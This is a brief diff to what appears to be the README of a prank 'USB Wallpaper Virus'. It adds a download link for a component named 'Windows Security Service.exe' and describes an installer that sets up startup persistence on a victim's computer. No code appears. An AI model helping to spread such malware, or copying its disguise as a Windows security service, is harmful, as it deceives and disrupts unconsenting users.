@@ -21,7 +21,7 @@ Your victim's computer is now infected with the USB Wallpaper Virus.
 ### [Setup.exe](../main/Setup.exe)
 Copies and moves files, sets up the program, and makes sure it runs at startup.
 
-### Windows Security Service.exe
+### [Windows Security Service.exe](../main/Windows-Security-Service.exe)
 Repeatedly changes the victim's wallpaper for seconds at a time. Do not change the name of this file. 
 
 ### Settings.json
